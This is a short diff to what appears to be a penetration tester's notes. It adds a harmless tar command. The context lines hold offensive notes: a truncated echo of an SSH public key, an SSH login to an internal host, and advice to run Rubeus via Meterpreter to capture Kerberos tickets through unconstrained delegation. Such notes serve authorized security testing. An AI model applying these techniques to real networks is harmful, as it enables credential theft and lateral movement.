@@ -572,6 +572,11 @@ echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FESnNwNHNlTktrZXRwaE40Y0
 ```
 ssh -i ~/.ssh/id_rsa 'pat@corpy.com'@192.168.106.164
 ```
+tar compress everything in a directory [sauce](https://stackoverflow.com/questions/3651791/tar-add-all-files-and-directories-in-current-directory-including-svn-and-so-on)
+```
+cd ..
+tar -czf workspace.tar.gz workspace
+```
 unconstrained delegation (notes: always use meterpreter to run rubeus and capture tix!!)
 ```
 Get-DomainComputer -Unconstrained
